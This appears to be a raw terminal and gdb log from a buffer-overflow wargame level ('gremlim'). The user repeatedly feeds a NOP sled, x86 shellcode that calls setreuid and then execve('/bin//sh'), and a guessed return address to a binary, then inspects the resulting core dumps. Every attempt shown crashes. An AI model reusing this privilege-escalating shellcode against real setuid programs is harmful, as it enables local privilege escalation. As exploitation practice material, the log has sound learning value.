+0xbffffb88:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb98:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffba8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbb8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbc8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbd8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbe8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbf8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc08:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc18:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc28:	0x41414141	0x41414141
+(gdb) 
+0xbffffc30:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc40:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc50:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc60:	0x41414141	0x41414141	0x41414141	0x4c004141
+0xbffffc70:	0x4f535345	0x3d4e4550	0x73752f7c	0x69622f72
+0xbffffc80:	0x656c2f6e	0x69707373	0x732e6570	0x73252068
+0xbffffc90:	0x45535500	0x4d414e52	0x48003d45	0x53545349
+0xbffffca0:	0x3d455a49	0x30303031	0x534f4800	0x4d414e54
+0xbffffcb0:	0x6f6c3d45	0x686c6163	0x2e74736f	0x61636f6c
+0xbffffcc0:	0x6d6f646c	0x006e6961	0x4e474f4c	0x3d454d41
+0xbffffcd0:	0x65746167	0x4d455200	0x4845544f	0x3d54534f
+0xbffffce0:	0x2e323931	0x2e383631	0x312e3635	0x49414d00
+0xbffffcf0:	0x762f3d4c	0x732f7261
+(gdb) r `python -c 'print"\90"*214+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\x20\xf9\xff\bf"'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/gate/gremlim `python -c 'print"\90"*214+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\x20\xf9\xff\bf"'`
+
+Breakpoint 1, 0x804846b in main ()
+(gdb) Quit
+(gdb) q
+The program is running.  Exit anyway? (y or n) y
+[gate@localhost gate]$ ls
+core  gremlim  gremlin  gremlin.c
+[gate@localhost gate]$ ./gremlim `python -c 'print"\90"*214+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\x20\xf9\xff\bf"'`
+\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90101̀É￱0F̀1￐h//shh/bin⏓ኂ°
+                                                                                     ̀10̀ 
+Segmentation fault (core dumped)
+[gate@localhost gate]$ gdb -c core
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux".
+Core was generated by `90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90101̀É￱0F̀1￐h//shh/bin⎧.
+Program terminated with signal 11, Segmentation fault.
+#0  0x30395c30 in ?? ()
+(gdb) x/50 $esp
+0xbffff860:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffff870:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffff880:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffff890:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffff8a0:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffff8b0:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffff8c0:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffff8d0:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffff8e0:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffff8f0:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffff900:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffff910:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffff920:	0x5c30395c	0x395c3039
+(gdb) 
+0xbffff928:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffff938:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffff948:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffff958:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffff968:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffff978:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffff988:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffff998:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffff9a8:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffff9b8:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffff9c8:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffff9d8:	0xc0313039	0x80cd31b0	0xc189c389	0x46b0c031
+0xbffff9e8:	0xc03180cd	0x2f2f6850
+(gdb) 
+0xbffff9f0:	0x2f686873	0x896e6962	0x895350e3	0xb0c289e1
+0xbffffa00:	0x3180cd0b	0xcd01b0c0	0x30390080	0x5c30395c
+0xbffffa10:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffffa20:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffffa30:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffffa40:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffffa50:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffffa60:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffffa70:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffffa80:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffffa90:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffffaa0:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffffab0:	0x30395c30	0x5c30395c
+(gdb) 
+0xbffffab8:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffffac8:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffffad8:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffffae8:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffffaf8:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffffb08:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffffb18:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffffb28:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffffb38:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffffb48:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffffb58:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffffb68:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffffb78:	0x395c3039	0x30395c30
+(gdb) 
+0xbffffb80:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffffb90:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffffba0:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffffbb0:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffffbc0:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffffbd0:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffffbe0:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffffbf0:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffffc00:	0x30395c30	0x5c30395c	0x395c3039	0x30395c30
+0xbffffc10:	0x5c30395c	0x395c3039	0x30395c30	0x5c30395c
+0xbffffc20:	0x395c3039	0x30395c30	0x5c30395c	0x395c3039
+0xbffffc30:	0x30395c30	0x3130395c	0xcd31b0c0	0x89c38980
+0xbffffc40:	0xb0c031c1	0x3180cd46
+(gdb) 
+0xbffffc48:	0x2f6850c0	0x6868732f	0x6e69622f	0x5350e389
+0xbffffc58:	0xc289e189	0x80cd0bb0	0x01b0c031	0xf90080cd
+0xbffffc68:	0x006608ff	0x3d445750	0x6d6f682f	0x61672f65
+0xbffffc78:	0x52006574	0x544f4d45	0x534f4845	0x39313d54
+0xbffffc88:	0x36312e32	0x36352e38	0x4800312e	0x4e54534f
+0xbffffc98:	0x3d454d41	0x61636f6c	0x736f686c	0x6f6c2e74
+0xbffffca8:	0x646c6163	0x69616d6f	0x454c006e	0x504f5353
+0xbffffcb8:	0x7c3d4e45	0x7273752f	0x6e69622f	0x73656c2f
+0xbffffcc8:	0x70697073	0x68732e65	0x00732520	0x52455355
+0xbffffcd8:	0x7461673d	0x534c0065	0x4c4f435f	0x3d53524f
+0xbffffce8:	0x303d6f6e	0x69663a30	0x3a30303d	0x303d6964
+0xbffffcf8:	0x34333b31	0x3d6e6c3a	0x333b3130	0x69703a36
+0xbffffd08:	0x3b30343d	0x733a3333
+(gdb) 
+0xbffffd10:	0x31303d6f	0x3a35333b	0x343d6462	0x33333b30
+0xbffffd20:	0x3a31303b	0x343d6463	0x33333b30	0x3a31303b
+0xbffffd30:	0x303d726f	0x35303b31	0x3b37333b	0x6d3a3134
+0xbffffd40:	0x31303d69	0x3b35303b	0x343b3733	0x78653a31
+0xbffffd50:	0x3b31303d	0x2a3a3233	0x646d632e	0x3b31303d
+0xbffffd60:	0x2a3a3233	0x6578652e	0x3b31303d	0x2a3a3233
+0xbffffd70:	0x6d6f632e	0x3b31303d	0x2a3a3233	0x6d74622e
+0xbffffd80:	0x3b31303d	0x2a3a3233	0x7461622e	0x3b31303d
+0xbffffd90:	0x2a3a3233	0x3d68732e	0x333b3130	0x2e2a3a32
+0xbffffda0:	0x3d687363	0x333b3130	0x2e2a3a32	0x3d726174
+0xbffffdb0:	0x333b3130	0x2e2a3a31	0x3d7a6774	0x333b3130
+0xbffffdc0:	0x2e2a3a31	0x3d6a7261	0x333b3130	0x2e2a3a31
+0xbffffdd0:	0x3d7a6174	0x333b3130
+(gdb) 
+0xbffffdd8:	0x2e2a3a31	0x3d687a6c	0x333b3130	0x2e2a3a31
+0xbffffde8:	0x3d70697a	0x333b3130	0x2e2a3a31	0x31303d7a
+0xbffffdf8:	0x3a31333b	0x3d5a2e2a	0x333b3130	0x2e2a3a31
+0xbffffe08:	0x303d7a67	0x31333b31	0x622e2a3a	0x303d327a
+0xbffffe18:	0x31333b31	0x622e2a3a	0x31303d7a	0x3a31333b
+0xbffffe28:	0x7a742e2a	0x3b31303d	0x2a3a3133	0x6d70722e
+0xbffffe38:	0x3b31303d	0x2a3a3133	0x6970632e	0x31303d6f
+0xbffffe48:	0x3a31333b	0x706a2e2a	0x31303d67	0x3a35333b
+0xbffffe58:	0x69672e2a	0x31303d66	0x3a35333b	0x6d622e2a
+0xbffffe68:	0x31303d70	0x3a35333b	0x62782e2a	0x31303d6d
+0xbffffe78:	0x3a35333b	0x70782e2a	0x31303d6d	0x3a35333b
+0xbffffe88:	0x6e702e2a	0x31303d67	0x3a35333b	0x69742e2a
+0xbffffe98:	0x31303d66	0x3a35333b
+(gdb) 
+0xbffffea0:	0x43414d00	0x50595448	0x33693d45	0x722d3638
+0xbffffeb0:	0x61686465	0x696c2d74	0x2d78756e	0x00756e67
+0xbffffec0:	0x4c49414d	0x61762f3d	0x70732f72	0x2f6c6f6f
+0xbffffed0:	0x6c69616d	0x7461672f	0x4e490065	0x52545550
+0xbffffee0:	0x652f3d43	0x692f6374	0x7475706e	0x42006372
+0xbffffef0:	0x5f485341	0x3d564e45	0x6d6f682f	0x61672f65
+0xbfffff00:	0x2e2f6574	0x68736162	0x4c006372	0x3d474e41
+0xbfffff10:	0x555f6e65	0x49440053	0x414c5053	0x39313d59
+0xbfffff20:	0x36312e32	0x36352e38	0x303a312e	0x4c00302e
+0xbfffff30:	0x414e474f	0x673d454d	0x00657461	0x564c4853
+0xbfffff40:	0x00323d4c	0x52455355	0x454d414e	0x4853003d
+0xbfffff50:	0x3d4c4c45	0x6e69622f	0x7361622f	0x4f480068
+0xbfffff60:	0x59545453	0x693d4550
+(gdb) 
+0xbfffff68:	0x00363833	0x54534948	0x455a4953	0x3030313d
+0xbfffff78:	0x534f0030	0x45505954	0x6e696c3d	0x672d7875
+0xbfffff88:	0x5400756e	0x3d4d5245	0x72657478	0x4f48006d
+0xbfffff98:	0x2f3d454d	0x656d6f68	0x7461672f	0x41500065
+0xbfffffa8:	0x2f3d4854	0x2f727375	0x61636f6c	0x69622f6c
+0xbfffffb8:	0x622f3a6e	0x2f3a6e69	0x2f727375	0x3a6e6962
+0xbfffffc8:	0x7273752f	0x3131582f	0x622f3652	0x2f3a6e69
+0xbfffffd8:	0x656d6f68	0x7461672f	0x69622f65	0x3d5f006e
+0xbfffffe8:	0x72672f2e	0x696c6d65	0x2f2e006d	0x6d657267
+0xbffffff8:	0x006d696c	0x00000000	Cannot access memory at address 0xc0000000
+(gdb) 
+0xc0000004:	Cannot access memory at address 0xc0000004
+(gdb) q
+[gate@localhost gate]$ ./gremlim `python -c 'print"\x90"*214+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\x20\xf9\xff\bf"'`
+101̀É￱0F̀1￐h//shh/bin⏓ኂ°
+                      ̀10̀ 
+Illegal instruction (core dumped)
+[gate@localhost gate]$ gdb -c core
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux".
+Core was generated by `./gremlim '.
+Program terminated with signal 4, Illegal instruction.
+#0  0x40030082 in ?? ()
+(gdb) x/50 $esp
+0xbffffa10:	0x00000003	0xbffffa54	0xbffffa64	0x40013868
+0xbffffa20:	0x00000003	0x08048380	0x00000000	0x080483a1
+0xbffffa30:	0x08048430	0x00000003	0xbffffa54	0x080482e0
+0xbffffa40:	0x080484bc	0x4000ae60	0xbffffa4c	0x40013e90
+0xbffffa50:	0x00000003	0xbffffb57	0xbffffb61	0xbffffc67
+0xbffffa60:	0x00000000	0xbffffc6c	0xbffffc7b	0xbffffc93
+0xbffffa70:	0xbffffcb2	0xbffffcd4	0xbffffcde	0xbffffea1
+0xbffffa80:	0xbffffec0	0xbffffeda	0xbffffeef	0xbfffff0b
+0xbffffa90:	0xbfffff16	0xbfffff2f	0xbfffff3c	0xbfffff44
+0xbffffaa0:	0xbfffff4e	0xbfffff5e	0xbfffff6c	0xbfffff7a
+0xbffffab0:	0xbfffff8b	0xbfffff96	0xbfffffa6	0xbfffffe6
+0xbffffac0:	0x00000000	0x00000003	0x08048034	0x00000004
+0xbffffad0:	0x00000020	0x00000005
+(gdb) 
+0xbffffad8:	0x00000006	0x00000006	0x00001000	0x00000007
+0xbffffae8:	0x40000000	0x00000008	0x00000000	0x00000009
+0xbffffaf8:	0x08048380	0x0000000b	0x000001f4	0x0000000c
+0xbffffb08:	0x000001f4	0x0000000d	0x000001f4	0x0000000e
+0xbffffb18:	0x000001f4	0x00000010	0x0fabfbff	0x0000000f
+0xbffffb28:	0xbffffb52	0x00000000	0x00000000	0x00000000
+0xbffffb38:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffb48:	0x00000000	0x00000000	0x36690000	0x2e003638
+0xbffffb58:	0x6572672f	0x6d696c6d	0x90909000	0x90909090
+0xbffffb68:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb78:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb88:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb98:	0x90909090	0x90909090
+(gdb) 
+0xbffffba0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbb0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbc0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbd0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbe0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbf0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc00:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc10:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc20:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc30:	0x90909090	0x31909090	0xcd31b0c0	0x89c38980
+0xbffffc40:	0xb0c031c1	0x3180cd46	0x2f6850c0	0x6868732f
+0xbffffc50:	0x6e69622f	0x5350e389	0xc289e189	0x80cd0bb0
+0xbffffc60:	0x01b0c031	0xf90080cd
+(gdb) `python -c 'print"\90"*214+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\x68\wsafaxfb\xff\bf"'`
+Undefined command: "".  Try "help".
+(gdb) q
+[gate@localhost gate]$ `python -c 'print"\90"*214+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\x68\xfb\xff\bf"'`asd
+bash2: \90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90101̀É￱0F̀1￐h//shh/bin⏓ኂ°
+                                                                                            ̀10̀fasd: File name too long
+[gate@localhost gate]$ ./gremlim `python -c 'print"\90"*214+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\x68\xfb\xff\bf"'`
+\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90101̀É￱0F̀1￐h//shh/bin⏓ኂ°
+                                                                                     ̀10̀f
+Segmentation fault (core dumped)
+[gate@localhost gate]$ ./gremlim `python -c 'print"\x90"*214+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\x68\xfb\xff\bf"'`
+101̀É￱0F̀1￐h//shh/bin⏓ኂ°
+                      ̀10̀f
+Segmentation fault (core dumped)
+[gate@localhost gate]$ gdb -c core
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux".
+Core was generated by `./gremlim '.
+Program terminated with signal 11, Segmentation fault.
+#0  0xfffb6880 in ?? ()
+(gdb) x/50 $esp
+0xbffffa20:	0x00006608	0xbffffa64	0xbffffa70	0x40013868
+0xbffffa30:	0x00000002	0x08048380	0x00000000	0x080483a1
+0xbffffa40:	0x08048430	0x00000002	0xbffffa64	0x080482e0
+0xbffffa50:	0x080484bc	0x4000ae60	0xbffffa5c	0x40013e90
+0xbffffa60:	0x00000002	0xbffffb57	0xbffffb61	0x00000000
+0xbffffa70:	0xbffffc6c	0xbffffc7b	0xbffffc93	0xbffffcb2
+0xbffffa80:	0xbffffcd4	0xbffffcde	0xbffffea1	0xbffffec0
+0xbffffa90:	0xbffffeda	0xbffffeef	0xbfffff0b	0xbfffff16
+0xbffffaa0:	0xbfffff2f	0xbfffff3c	0xbfffff44	0xbfffff4e
+0xbffffab0:	0xbfffff5e	0xbfffff6c	0xbfffff7a	0xbfffff8b
+0xbffffac0:	0xbfffff96	0xbfffffa6	0xbfffffe6	0x00000000
+0xbffffad0:	0x00000003	0x08048034	0x00000004	0x00000020
+0xbffffae0:	0x00000005	0x00000006
+(gdb) 
+0xbffffae8:	0x00000006	0x00001000	0x00000007	0x40000000
+0xbffffaf8:	0x00000008	0x00000000	0x00000009	0x08048380
+0xbffffb08:	0x0000000b	0x000001f4	0x0000000c	0x000001f4
+0xbffffb18:	0x0000000d	0x000001f4	0x0000000e	0x000001f4
+0xbffffb28:	0x00000010	0x0fabfbff	0x0000000f	0xbffffb52
+0xbffffb38:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffb48:	0x00000000	0x00000000	0x36690000	0x2e003638
+0xbffffb58:	0x6572672f	0x6d696c6d	0x90909000	0x90909090
+0xbffffb68:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb78:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb88:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb98:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffba8:	0x90909090	0x90909090
+(gdb) 
+0xbffffbb0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbc0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbd0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbe0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbf0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc00:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc10:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc20:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc30:	0x90909090	0x31909090	0xcd31b0c0	0x89c38980
+0xbffffc40:	0xb0c031c1	0x3180cd46	0x2f6850c0	0x6868732f
+0xbffffc50:	0x6e69622f	0x5350e389	0xc289e189	0x80cd0bb0
+0xbffffc60:	0x01b0c031	0xfb6880cd	0x006608ff	0x3d445750
+0xbffffc70:	0x6d6f682f	0x61672f65
+(gdb) 
+0xbffffc78:	0x52006574	0x544f4d45	0x534f4845	0x39313d54
+0xbffffc88:	0x36312e32	0x36352e38	0x4800312e	0x4e54534f
+0xbffffc98:	0x3d454d41	0x61636f6c	0x736f686c	0x6f6c2e74
+0xbffffca8:	0x646c6163	0x69616d6f	0x454c006e	0x504f5353
+0xbffffcb8:	0x7c3d4e45	0x7273752f	0x6e69622f	0x73656c2f
+0xbffffcc8:	0x70697073	0x68732e65	0x00732520	0x52455355
+0xbffffcd8:	0x7461673d	0x534c0065	0x4c4f435f	0x3d53524f
+0xbffffce8:	0x303d6f6e	0x69663a30	0x3a30303d	0x303d6964
+0xbffffcf8:	0x34333b31	0x3d6e6c3a	0x333b3130	0x69703a36
+0xbffffd08:	0x3b30343d	0x733a3333	0x31303d6f	0x3a35333b
+0xbffffd18:	0x343d6462	0x33333b30	0x3a31303b	0x343d6463
+0xbffffd28:	0x33333b30	0x3a31303b	0x303d726f	0x35303b31
+0xbffffd38:	0x3b37333b	0x6d3a3134
+(gdb) 
+0xbffffd40:	0x31303d69	0x3b35303b	0x343b3733	0x78653a31
+0xbffffd50:	0x3b31303d	0x2a3a3233	0x646d632e	0x3b31303d
+0xbffffd60:	0x2a3a3233	0x6578652e	0x3b31303d	0x2a3a3233
+0xbffffd70:	0x6d6f632e	0x3b31303d	0x2a3a3233	0x6d74622e
+0xbffffd80:	0x3b31303d	0x2a3a3233	0x7461622e	0x3b31303d
+0xbffffd90:	0x2a3a3233	0x3d68732e	0x333b3130	0x2e2a3a32
+0xbffffda0:	0x3d687363	0x333b3130	0x2e2a3a32	0x3d726174
+0xbffffdb0:	0x333b3130	0x2e2a3a31	0x3d7a6774	0x333b3130
+0xbffffdc0:	0x2e2a3a31	0x3d6a7261	0x333b3130	0x2e2a3a31
+0xbffffdd0:	0x3d7a6174	0x333b3130	0x2e2a3a31	0x3d687a6c
+0xbffffde0:	0x333b3130	0x2e2a3a31	0x3d70697a	0x333b3130
+0xbffffdf0:	0x2e2a3a31	0x31303d7a	0x3a31333b	0x3d5a2e2a
+0xbffffe00:	0x333b3130	0x2e2a3a31
+(gdb) 
+0xbffffe08:	0x303d7a67	0x31333b31	0x622e2a3a	0x303d327a
+0xbffffe18:	0x31333b31	0x622e2a3a	0x31303d7a	0x3a31333b
+0xbffffe28:	0x7a742e2a	0x3b31303d	0x2a3a3133	0x6d70722e
+0xbffffe38:	0x3b31303d	0x2a3a3133	0x6970632e	0x31303d6f
+0xbffffe48:	0x3a31333b	0x706a2e2a	0x31303d67	0x3a35333b
+0xbffffe58:	0x69672e2a	0x31303d66	0x3a35333b	0x6d622e2a
+0xbffffe68:	0x31303d70	0x3a35333b	0x62782e2a	0x31303d6d
+0xbffffe78:	0x3a35333b	0x70782e2a	0x31303d6d	0x3a35333b
+0xbffffe88:	0x6e702e2a	0x31303d67	0x3a35333b	0x69742e2a
+0xbffffe98:	0x31303d66	0x3a35333b	0x43414d00	0x50595448
+0xbffffea8:	0x33693d45	0x722d3638	0x61686465	0x696c2d74
+0xbffffeb8:	0x2d78756e	0x00756e67	0x4c49414d	0x61762f3d
+0xbffffec8:	0x70732f72	0x2f6c6f6f
+(gdb) q
+[gate@localhost gate]$ ./gremlim `python -c 'print"\x90"*214+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\3\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\x68\xfb\xff\bf"'`
+101̀É￱0F̀1￐h//shh/bin⏓ኂ°
+                      ̀10̀f
+Segmentation fault (core dumped)
